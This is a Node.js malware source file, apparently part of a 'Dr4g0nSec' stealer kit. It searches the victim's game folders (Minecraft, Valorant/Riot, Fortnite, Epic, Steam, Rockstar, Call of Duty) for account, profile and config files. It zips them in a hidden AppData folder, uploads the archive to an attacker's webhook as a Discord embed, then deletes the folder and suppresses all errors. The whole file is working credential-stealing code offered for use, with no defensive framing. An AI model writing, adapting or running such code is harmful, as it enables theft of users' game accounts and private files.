const fs = require("fs");
const path = require("path");
const os = require("os");
const archiver = require("archiver");
const axios = require("axios");
const FormData = require("form-data");

const H00K3_URL = "%WEBHOOK%";

const FILE_TERMS = [
  'save', 'config', 'settings', 'profile', 'log', 'accounts',
  'server', 'world', 'mods', 'launcher_profiles.json', 'options.txt',
  'accounts.json', 'riotclient', 'valorant', 'leagueclient', 'fortnite', 'gta', 'cod'
];

const GAME_DIRS = [
  path.join(os.homedir(), 'AppData', 'Roaming', '.minecraft'),
  path.join(os.homedir(), 'AppData', 'Local', 'Packages'),
  path.join(os.homedir(), 'AppData', 'Local', 'FortniteGame'),
  path.join(os.homedir(), 'AppData', 'Local', 'Valorant'),
  path.join(os.homedir(), 'AppData', 'Local', 'Riot Games'),
  path.join(os.homedir(), 'AppData', 'Local', 'EpicGamesLauncher'),
  path.join(os.homedir(), 'AppData', 'Local', 'Steam'),
  path.join(os.homedir(), 'Documents', 'Rockstar Games'),
  path.join(os.homedir(), 'Documents', 'Call of Duty'),
  path.join(os.homedir(), 'Saved Games')
];

function searchGameFiles(directories, terms) {
  const found = new Set();

  for (const dir of directories) {
    try {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        let stat;
        try {
          stat = fs.statSync(fullPath);
        } catch (_) {
          continue;
        }

        if (stat.isFile() && terms.some(t => entry.name.toLowerCase().includes(t))) {
          found.add(fullPath);
        } else if (stat.isDirectory()) {
          try {
            const subEntries = fs.readdirSync(fullPath);
            for (const sub of subEntries) {
              const subPath = path.join(fullPath, sub);
              try {
                const subStat = fs.statSync(subPath);
                if (
                  subStat.isFile() &&
                  terms.some(t => sub.toLowerCase().includes(t))
                ) {
                  found.add(subPath);
                }
              } catch (_) {
                continue;
              }
            }
          } catch (_) {
            continue;
          }
        }
      }
    } catch (_) {
      continue;
    }
  }

  return Array.from(found);
}

function createTempDir() {
  const tempDir = path.join(os.homedir(), "AppData", "Local", "SecGames");
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
  return tempDir;
}

function createZip(files, outputPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(outputPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    output.on("close", () => resolve(outputPath));
    output.on("error", err => reject(err));
    archive.on("error", err => reject(err));

    archive.pipe(output);

    files.forEach(file => {
      try {
        const relPath = path.relative(os.homedir(), file);
        archive.file(file, { name: relPath });
      } catch (_) {}
    });

    archive.finalize();
  });
}

async function sendToWebhook(zipPath, files) {
  const fileList = files.map(f => path.basename(f));
  const embedDescription = `<:Gengar:1367090325893419048> • **Arquivos de jogos encontrados:**\n` +
    fileList.slice(0, 15).map(f => `└─< ${f}`).join("\n") +
    (fileList.length > 15 ? "\n└─<...e mais arquivos" : "");

  const embed = {
    title: "<:dr4g0n:1362932398102155475> Dr4g0nSec | GameFiles <:dr4g0n:1362932398102155475>",
    description: embedDescription,
    color: 0x250e80,
    footer: {
      text: "Created by: sk4rty | Dr4g0nSec on Top!",
      icon_url: "https://avatars.githubusercontent.com/u/150484081?v=4"
    }
  };

  const form = new FormData();
  form.append("file", fs.createReadStream(zipPath));
  form.append("payload_json", JSON.stringify({
    username: "Dr4g0nSec | GameFiles",
    avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
    embeds: [embed]
  }));

  try {
    await axios.post(H00K3_URL, form, {
      headers: form.getHeaders(),
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });
  } catch (err) {
  }
}

function deleteFolderRecursive(folderPath) {
  if (fs.existsSync(folderPath)) {
    fs.readdirSync(folderPath).forEach(file => {
      const curPath = path.join(folderPath, file);
      if (fs.lstatSync(curPath).isDirectory()) {
        deleteFolderRecursive(curPath);
      } else {
        fs.unlinkSync(curPath);
      }
    });
    fs.rmdirSync(folderPath);
  }
}

(async () => {
  const found = searchGameFiles(GAME_DIRS, FILE_TERMS);
  if (found.length === 0) return;

  const tempDir = createTempDir();
  const zipPath = path.join(tempDir, "Dr4g0nSec_GameFiles.zip");

  try {
    await createZip(found, zipPath);
    await sendToWebhook(zipPath, found);
    deleteFolderRecursive(tempDir);
  } catch (err) {
  }
})();
